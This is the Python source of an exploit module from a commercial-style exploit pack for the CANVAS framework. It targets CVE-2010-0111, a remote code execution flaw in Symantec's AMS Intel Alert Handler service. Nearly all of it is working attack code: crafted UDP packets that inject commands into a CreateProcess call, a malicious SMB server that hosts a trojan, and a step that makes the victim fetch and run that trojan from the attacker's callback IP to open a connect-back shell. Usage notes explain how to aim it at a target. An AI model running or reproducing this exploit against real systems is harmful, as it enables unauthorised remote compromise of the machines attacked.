
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import socket
import sys
import time
from struct import *
from threading import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import pelib
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from smbserver import *
from libs.canvasos import canvasos


######################################################################################
NAME = "Symantec AMS Intel Alert Handler HDNLRSVC CreateProcess Remote Code Execution"
DESCRIPTION = "Exploits an insecure call to CreateProcess in the Symantec AMS Intel Alert Handler"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Symantec'
DOCUMENTATION["Date public"] = "2010-06-12"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2010-0111"
DOCUMENTATION['CVE Url'] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-0111"
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-029/"
DOCUMENTATION["Notes"] = """
The vulnerability exists in HDNLRSVC.EXE - the Intel Handler service of the Intel Alert
Management System (aka AMS or AMS2), as used in Symantec AntiVirus Corporate Edition (SAVCE)
10.x before 10.1 MR10, Symantec System Center (SSC) 10.x, and Symantec Quarantine Server 3.5
and 3.6. 

This exploit allows remote attackers to execute arbitrary programs by sending MsgSys.exe
a specially crafted UDP packet that is passed to HDNLRSVC.EXE and used in a CreateProcess
call.

The maxlen for the exploit payload buffer is 122 bytes but to ensure reliability use the
TCP ConnectBack payload or restrict Execute Commands to <= 64 bytes.

The time taken for HDNLRSVC.EXE to call CreateProcess may change, as does the number
of times it is called. This may result a minutes or more delay and multiple connectback nodes.

The TCP ConnectBack payload is provided SMB from a malicious SMB server that is spawned by the exploit.
Windows users must disable the native Windows SMB server before running the module. On Windows 7
this is achieved by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting the 
OS.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]


NOTES="""
WP> White Phosphorus Exploit Pack
WP> Symantec AMS Intel Alert Handler HDNLRSVC CreateProcess Remote Code Execution
---------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: Execute Command

Example:
./3rdparty/White_Phosphorus/exploits/wp_symantec_ams_hdnlrsvc_createprocess/wp_symantec_ams_hdnlrsvc_createprocess.py  -v0 -t 10.1.1.10 -l 10.1.1.1  -O payload:0
"""

PORT = 38037
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.shell_EXECCMD = False
        self.share_filename = "\\shared\\"+ "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + ".exe"
        self.payloadHostname = "W"*8
        self.ConfigName = "X"*64
        self.CommandLine = "Y"*64
        self.RunArgs = "Z"*64
        self.randomPad = "".join( [ random.choice(string.lowercase) for x in range(64) ] )
        self.randomHostname = "".join( [ random.choice(string.lowercase) for x in range(8) ] )
        return

    def usage(self):
        self.wp_usage(targets)
        return
    
    def neededListenerTypes(self):
        self.getArgs()
        
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        return
    
    def bannercheckAMS(self,host,port):                
        payload = (
            "\x4f\x52\x49\x47\x43\x4e\x46\x47\x10\x00\x00\x00\x00\x00\x00\x00"
            "\x04\x00\x0f\x01\x31\x66\x00\x00\x00\x00\x00\x00\x4f\x52\x49\x47"
            "\x00\x00\x00\x00\x00\x00")
        
        self.log("WP> Checking for AMS service at %s:%s"%(host,port))
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, port))
        s.settimeout(120)
        try:
            s.sendall(payload)
            response = s.recv(2048)
        except:
            self.log("WP> Socket timed out - no response recieved")
            self.log("WP> Service may take minutes to respond - retry module to confirm")
            return 0
        s.close()
        
        if response.find("CNFGORIG") != -1:
            self.log("WP> Response matched AMS Service")
            return 1
        
        self.log("WP> Response did not match AMS Service")
        self.log("WP> %s"%str(response))
        return 0

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def splitExecCMD(self):
        # Called if Execute Command is greater than 64 bytes
        # split command into two parts and span across both CommandLine and RunArgs buffers
        cmds = []
        a = ""
        for c in self.execCMD.split(" "):
            if (len(a)+len(c)) >= (64-6):
                if a[len(a)-1] == " ":
                    cmds.append((a[0:(len(a)-1)])) # remove trailing space
                else:
                    cmds.append(a)
                a = ""
            a += c
            a += " "
        if a[len(a)-1] == " ":
            cmds.append((a[0:(len(a)-1)])) # remove trailing space
        else:
            cmds.append(a)
            
        if len(cmds) > 2:
            self.log("WP> Unable to parse command: %s"%self.execCMD)
            self.log("WP> Please shorten or send over multiple attempts")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        return cmds
    
    def makesploit(self):
        payload = (
            "\x50\x52\x47\x58\x43\x4e\x46\x47\x10\x00\x00\x00\x00\x00\x00\x00"
            "\x04\x41\x4c\x48\x44\x4a\x7c\x00\x00\x01\x00\x00\x00\x01\x00\x15"
            "\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e\x20\x43"
            "\x68\x61\x6e\x67\x65\x00\x25\x00\x53\x79\x6d\x61\x6e\x74\x65\x63"
            "\x20\x41\x6e\x74\x69\x56\x69\x72\x75\x73\x20\x43\x6f\x72\x70\x6f"
            "\x72\x61\x74\x65\x20\x45\x64\x69\x74\x69\x6f\x6e\x00\x0d\xfa\x03"
            "\x4e\x3f\x09\x00\x57\x57\x57\x57\x57\x57\x57\x57\x00\x02\x08\x09"
            "\x00\x48\x6f\x73\x74\x6e\x61\x6d\x65\x00\x0b\x00\x09\x00\x57\x57"
            "\x57\x57\x57\x57\x57\x57\x00\x08\x0c\x00\x44\x65\x73\x63\x72\x69"
            "\x70\x74\x69\x6f\x6e\x00\x07\x00\x05\x00\x54\x65\x73\x74\x00\x00"
            "\x07\x08\x12\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f"
            "\x6e\x4e\x61\x6d\x65\x00\x43\x00\x41\x00\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00\x08\x0c\x00\x43\x6f"
            "\x6d\x6d\x61\x6e\x64\x4c\x69\x6e\x65\x00\x43\x00\x41\x00\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x00\x08"
            "\x08\x00\x52\x75\x6e\x41\x72\x67\x73\x00\x04\x00\x02\x00\x20\x00"
            "\x03\x05\x00\x4d\x6f\x64\x65\x00\x04\x00\x01\x00\x00\x00\x0a\x0d"
            "\x00\x46\x6f\x72\x6d\x61\x74\x53\x74\x72\x69\x6e\x67\x00\x02\x00"
            "\x00\x00\x08\x12\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69"
            "\x6f\x6e\x4e\x61\x6d\x65\x00\x02\x00\x00\x00\x08\x0c\x00\x48\x61"
            "\x6e\x64\x6c\x65\x72\x48\x6f\x73\x74\x00\x0c\x00\x0a\x00\x6c\x6f"
            "\x63\x61\x6c\x68\x6f\x73\x74\x00\x00\x00\x00")
        
        payload = payload.replace(self.payloadHostname, self.randomHostname)
        payload = payload.replace(self.ConfigName, self.randomPad)
        payload = payload.replace(self.CommandLine, (self.execCMD + "\x00"*(len(self.CommandLine) - len(self.execCMD))))
        return payload

    def makesploitRunArgs(self):
        payload = (
            "\x50\x52\x47\x58\x43\x4e\x46\x47\x10\x00\x00\x00\x00\x00\x00\x00"
            "\x04\x41\x4c\x48\x44\x8c\x45\x00\x00\x01\x00\x00\x00\x01\x00\x15"
            "\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f\x6e\x20\x43"
            "\x68\x61\x6e\x67\x65\x00\x25\x00\x53\x79\x6d\x61\x6e\x74\x65\x63"
            "\x20\x41\x6e\x74\x69\x56\x69\x72\x75\x73\x20\x43\x6f\x72\x70\x6f"
            "\x72\x61\x74\x65\x20\x45\x64\x69\x74\x69\x6f\x6e\x00\xd1\xe0\x03"
            "\x4e\x3f\x09\x00\x57\x57\x57\x57\x57\x57\x57\x57\x00\x02\x08\x09"
            "\x00\x48\x6f\x73\x74\x6e\x61\x6d\x65\x00\x0b\x00\x09\x00\x57\x57"
            "\x57\x57\x57\x57\x57\x57\x00\x08\x0c\x00\x44\x65\x73\x63\x72\x69"
            "\x70\x74\x69\x6f\x6e\x00\x07\x00\x05\x00\x54\x65\x73\x74\x00\x00"
            "\x07\x08\x12\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f"
            "\x6e\x4e\x61\x6d\x65\x00\x43\x00\x41\x00\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
            "\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00\x08\x0c\x00\x43\x6f"
            "\x6d\x6d\x61\x6e\x64\x4c\x69\x6e\x65\x00\x43\x00\x41\x00\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59"
            "\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x59\x00\x08"
            "\x08\x00\x52\x75\x6e\x41\x72\x67\x73\x00\x43\x00\x41\x00\x5a\x5a"
            "\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a"
            "\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a"
            "\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a"
            "\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x00\x03"
            "\x05\x00\x4d\x6f\x64\x65\x00\x04\x00\x02\x00\x00\x00\x0a\x0d\x00"
            "\x46\x6f\x72\x6d\x61\x74\x53\x74\x72\x69\x6e\x67\x00\x02\x00\x00"
            "\x00\x08\x12\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69\x6f"
            "\x6e\x4e\x61\x6d\x65\x00\x02\x00\x00\x00\x08\x0c\x00\x48\x61\x6e"
            "\x64\x6c\x65\x72\x48\x6f\x73\x74\x00\x0c\x00\x0a\x00\x6f\x6f\x63"
            "\x61\x6c\x68\x6f\x73\x74\x00\x00\x00\x00")

        cmds = []
        cmds = self.splitExecCMD()
        payload = payload.replace(self.payloadHostname, self.randomHostname)
        payload = payload.replace(self.ConfigName, self.randomPad)
        payload = payload.replace(self.CommandLine, ("cmd"+ r" /c"+"\x20"*((len(self.CommandLine) - len(cmds[0]))-6)+cmds[0]))
        payload = payload.replace(self.RunArgs, (cmds[1] + "\x00"*(len(self.RunArgs) - len(cmds[1]))))
        return payload

    def set_up_smb_server(self):
        self.log("WP> Starting SMB Server on 0.0.0.0:445")
        mysmb = SMBServer('0.0.0.0', 445)
        mysmb.timeout = 30
        
        my_os  = canvasos("Windows")
        my_os.arch = "x86"
        
        try:
            ret = self.buildmosdeftrojan(self.callback.ip,self.callback.port, target_os=my_os, http=False, ssl=False, universal=True)
        except Exception, err:
            self.log("WP> Problem building MOSDEF PE Trojan: %s"%(err))
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        mysmb.set_file_data('%s' %(self.share_filename), self.mosdeftrojan)

        if mysmb.listen()==0:
            self.log("WP> Unable to listen on port 445")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        handledRequest = False
        
        while True:
            if self.state==self.HALT:
                mysmb.close()
                self.log("WP> SMB: Halted - closing thread 1")
                return True 

            mysmb.timeout=3
            while mysmb.accept() == 0 and self.state != self.HALT:
                self.log("WP> SMB: Awaiting new client")

            if self.state==self.HALT:
                mysmb.close()
                self.log("WP> SMB: Halted - closing thread 2")
                return True

            while mysmb.handle():
                if self.state==self.HALT:
                    mysmb.close()
                    self.log("WP> SMB: Halted - closing thread 3")
                    return True
                self.log("WP> SMB: Handled request")
        return True

    def run(self):
        self.getArgs()
        self.result_error = 0

        if self.shell_EXECCMD:
            if len(self.execCMD) > 122:
                self.log("WP> Unable to parse command: %s"%self.execCMD)
                self.log("WP> Length: %d bytes"%len(self.execCMD))
                self.log("WP> Execute Command maxlen <= 122 bytes")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0

            if len(self.execCMD) < 65:
                payload = self.makesploit()
            else:
                payload = self.makesploitRunArgs()
                
            if not payload:
                self.log("WP> Error occured during payload generation - please rerun module")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
              
            try:
                s = self.getudpsock()
                s.connect((self.host, self.port))
                s.settimeout(10)
                s.setblocking(0)

                self.log("WP> Sending Exploit")
                s.sendto(payload, (self.host, self.port))
            except:
                self.log("WP> Attack reported no open socket - service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            time.sleep(10)
            s.close()
            self.log("WP> AMS may take a minute or more to execute payload")
            self.log("WP> Use TCP Connectback if response required")
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            return 1
        else:
            smb = Thread(target=self.set_up_smb_server)
            smb.start()
            
            self.execCMD = "\\\\CALLBACKPAYLOAD"
            self.execCMD = self.execCMD.replace('CALLBACK', self.callback.ip)
            self.execCMD = self.execCMD.replace('PAYLOAD', self.share_filename)
            payload = self.makesploit()
            try:
                s = self.getudpsock()
                s.connect((self.host, self.port))
                s.settimeout(60)
                s.setblocking(0)
    
                self.log("WP> Sending Exploit")
                s.sendto(payload, (self.host, self.port))
            except:
                self.log("WP> Attack reported no open socket - service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            time.sleep(10)
            s.close()
    
            # Check if follow up is required for some shellcodes
            if self.result_error==0:
                ret = self.wp_postExploitShellcode(s)
                if ret:
                    return ret
    
            ret=self.ISucceeded()
            self.log("WP> AMS may take a minute or more to execute payload")
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()